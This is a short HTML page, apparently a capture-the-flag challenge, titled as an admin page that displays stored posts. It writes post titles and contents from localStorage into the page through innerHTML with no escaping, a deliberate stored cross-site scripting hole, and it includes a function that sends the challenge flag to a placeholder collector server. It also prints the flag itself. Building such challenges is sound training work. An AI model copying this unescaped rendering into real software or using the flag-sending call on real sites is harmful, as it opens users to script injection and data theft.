<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>관리자 페이지</title>
</head>
<body>
    <h1>관리자 페이지</h1>
    <p>관리자가 새로운 게시글을 검토합니다...</p>
    <div id="adminView"></div>
    <script>
        const FLAG = 'K4{4774ck_XSS}';
        for (let key in localStorage) {
            if (key.startsWith('post_')) {
                const { title, content } = JSON.parse(localStorage[key]);
                const div = document.createElement('div');
                div.innerHTML = `
                    <h3>${title}</h3>
                    <p>${content}</p>
                    <hr>
                `;
                document.getElementById('adminView').appendChild(div);
            }
        }

        window.revealFlag = function () {
            fetch('http://your-server.com/capture?flag=' + FLAG);
        }
    </script>
</body>
</html>
